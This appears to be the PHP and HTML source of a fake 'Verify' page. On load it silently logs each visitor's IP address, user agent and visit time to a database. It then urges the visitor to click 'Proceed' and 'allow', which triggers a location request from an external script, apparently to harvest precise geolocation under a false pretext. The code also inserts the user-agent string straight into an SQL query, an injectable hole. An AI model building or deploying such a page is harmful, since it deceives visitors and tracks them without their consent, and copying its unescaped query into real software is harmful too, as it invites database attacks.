<?php
    include_once "credentials.php";
    require 'vendor/autoload.php';
    $result = new WhichBrowser\Parser($_SERVER['HTTP_USER_AGENT']);
    $useragent = $result->toString();
    $ip = $_SERVER["REMOTE_ADDR"];

    date_default_timezone_set("Asia/Kolkata");
    $datet = date('d-m-Y H:i:s');

    $sql = "INSERT INTO iptrack(ip, datet, ua) VALUES('$ip', '$datet', '$useragent')";
    mysqli_query($conn, $sql);

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Verify</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
        <link rel="stylesheet" href="mememe/lol.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
        <script src="mememe/lol.js"></script>
    </head>
    <body>
    <center>
        <div class="container">
            <div class="main">
                <button onclick="getLocation()" class="btn">Proceed</button>
                <br><br>
                <p>Click the button and click allow</p>
            </div>
        </div>
    </center>
    </body>
</html>